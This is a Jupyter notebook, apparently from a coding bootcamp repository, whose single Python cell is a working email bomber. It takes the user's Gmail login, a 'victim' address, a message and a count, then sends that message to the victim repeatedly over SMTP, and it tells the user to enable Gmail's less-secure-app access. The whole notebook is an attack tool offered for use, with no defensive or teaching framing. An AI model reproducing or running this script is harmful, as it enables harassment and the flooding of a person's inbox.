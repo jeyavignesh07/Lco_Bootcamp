{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import sys\n",
    "import getpass\n",
    "import smtplib\n",
    "\n",
    "email = input(\"enter your email : \")\n",
    "pwd = getpass.getpass(\"enter your password : \")\n",
    "vemail = input(\"enter the victims email : \")\n",
    "msg = input(\"enter your message for the victim : \")\n",
    "ntim = int(input(\"enter the number of times you want to send email : \"))\n",
    "try:\n",
    "    smtplib.server = 'smtp.gmail.com'\n",
    "    port = 587\n",
    "    server = smtplib.SMTP(smtplib.server,port)\n",
    "    server.ehlo()\n",
    "    server.starttls()\n",
    "    server.login(email,pwd)\n",
    "    print(\"[* Sending in progress.....\\n]\")\n",
    "    i = 0\n",
    "    while i < ntim:\n",
    "        i += 1\n",
    "        server.sendmail(email,vemail,msg)\n",
    "        if i == 1:\n",
    "            print(\"[+] %dst email has been sent successfully \" %(i))\n",
    "        elif i == 2:\n",
    "            print(\"[+] %dnd email has been sent successfully \" %(i))\n",
    "        elif i == 3:\n",
    "            print(\"[+] %drd email has been sent successfully \" %(i))\n",
    "        else:\n",
    "            print(\"[+] %dth email has been sent successfully \" %(i))\n",
    "        sys.stdout.flush()\n",
    "    server.quit()\n",
    "    print(\"[+] all done\")\n",
    "except KeyboardInterrupt:\n",
    "    print()\n",
    "    print(\"[x] cancelled\")\n",
    "    sys.exit()\n",
    "except smtplib.SMTPAuthenticationError:\n",
    "    print()\n",
    "    print(\"[x] the username and password is inncorrect \")\n",
    "    print(\"[x] check if the option of application are less secure is enable \")\n",
    "    sys.exit()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
